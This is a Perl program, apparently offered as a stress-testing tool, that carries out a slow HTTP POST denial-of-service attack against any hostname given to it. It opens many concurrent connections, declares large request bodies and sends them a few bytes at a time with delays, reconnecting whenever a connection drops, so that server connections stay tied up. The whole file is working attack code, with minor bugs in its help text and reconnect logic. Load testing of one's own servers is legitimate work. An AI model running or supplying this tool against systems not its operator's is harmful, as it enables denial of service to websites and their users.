#!/usr/bin/perl

=head1 NAME

slow-post.pl - AnyEvent-based stress-testing tool which uses slow HTTP POST

=head1 DESCRIPTION

This program allows to perform stress tests for slow HTTP POST attacks

=head1 LICENSE

This program is free software; you can redistribute it and/or
modify it under the same terms as Perl itself. See L<perlartistic>.

=head1 AUTHOR

Vitaly Kramskikh

=cut

use strict;
use warnings;

use POSIX 'strftime';

use Getopt::Long;

use AnyEvent;
use AnyEvent::Handle;

my $port = 80;

my $concurrency = 25;
my $min_chunk_size = 4;
my $max_chunk_size = 16;
my $min_body_size = $max_chunk_size * 512;
my $max_body_size = $min_body_size * 4;
my $body_send_delay = 2;
my $connection_delay = 1;

my $help;

my $help_message = <<HELP
Usage: $0 [options] hostname

  --concurrency=NUM         number of concurrent connections (default: $concurrency)
  --min-chunk-size=BYTES    min post body chunk size in bytes (default: $min_chunk_size)
  --max-chunk-size=BYTES    max post body chunk size in bytes (default: $max_chunk_size)
  --min-body-size=BYTES     min post body size (default: $min_body_size)
  --max-body-size=BYTES     max post body size (default: $max_body_size)
  --body-send-delay=SEC     delay in seconds between completion of sending
                            previous chunk and start of sending next chunk
                            (default: $connection_delay)
  --connection-delay=SEC    delay in seconds before reconnecting (default: $connection_delay)

HELP
;

GetOptions(
    'concurrency=i' => \$concurrency,
    'min-chunk-size=i' => \$min_chunk_size,
    'max-chunk-size=i' => \$max_chunk_size,
    'min-body-size=i' => \$min_body_size,
    'max-body-size=i' => \$max_body_size,
    'connection-delay=f' => \$connection_delay,
    'body-send-delay=f' => \$body_send_delay,
    'help' => \$help,
);

my $host = $ARGV[0];

if (!defined $host || $help) {
    print $help_message;
    exit 1;
}

my @clients;

foreach my $n (1 .. $concurrency) {
    my $client = new SlowHTTPClient(
        name => "Client #$n",
        host => $host,
        port => $port,
        path => '/',
        connection_delay => $connection_delay,
        body_send_delay => $body_send_delay,
        min_chunk_size => $min_chunk_size,
        max_chunk_size => $max_chunk_size,
        min_body_size => $min_body_size,
        max_body_size => $max_body_size,
    );
    
    $client->connect;
    
    push @clients, $client;
}

AnyEvent->loop;

package SlowHTTPClient;

sub new {
    my ($class, %params) = @_;
    
    return bless {
        %params,
        fh => undef,
    }, $class;
}

sub log {
    my ($self, $message) = @_;
    
    print POSIX::strftime('[%d.%m.%Y %H:%M:%S]', localtime) . " $self->{name}: $message\n";
}

sub connect {
    my $self = shift;
    
    $self->{body_size} = $self->{min_body_size} + int(rand($self->{max_body_size} - $self->{min_body_size} + 1));
    $self->{body} = 'A' x $self->{body_size};
    
    $self->{fh} = new AnyEvent::Handle(
        connect => [$self->{host}, $self->{port}],
        on_error => sub {
            $self->log("Connection dropped! Sent " . ($self->{body_size} - length $self->{body}) . " of " . $self->{body_size} . " bytes");
            $self->reconnect($self->{connection_delay} * 5);
        },
        on_eof => sub {$self->reconnect},
        on_drain => sub {
            $self->{send_delay_timer} = AnyEvent->timer(
                after => $self->{body_send_delay},
                cb => sub {$self->send_chunk},
            )
        },
        on_connect => sub {
            $self->log('Connected! Body size is ' . $self->{body_size});
            
            $self->send_headers;
            $self->send_chunk;
        },
        keepalive => 1,
    );
}

sub reconnect {
    my ($self, $delay) = shift;
    
    delete $self->{send_delay_timer};
    
    $self->log('Reconnecting...');
    
    $self->{reconnection_timer} = AnyEvent->timer(
        after => $delay || $self->{connection_delay},
        cb => sub {$self->connect},
    );
}

sub send_headers {
    my $self = shift;
    
    my $request = "POST $self->{path} HTTP/1.1\n" .
        "Host: $self->{host}\n" .
        "Content-Type: application/x-www-form-urlencoded\n" .
        "Content-Length: " . length($self->{body}) . "\n" .
        "\n";
    
    $self->{fh}->push_write($request);
}

sub send_chunk {
    my $self = shift;
    
    my $chunk_size = $self->{min_chunk_size} + int(rand($self->{max_chunk_size} - $self->{min_chunk_size} + 1));
    my $chunk = substr($self->{body}, 0, $chunk_size, '');
    
    if ($chunk) {
        $self->{fh}->push_write($chunk);
    } else {
        $self->reconnect;
    }
}
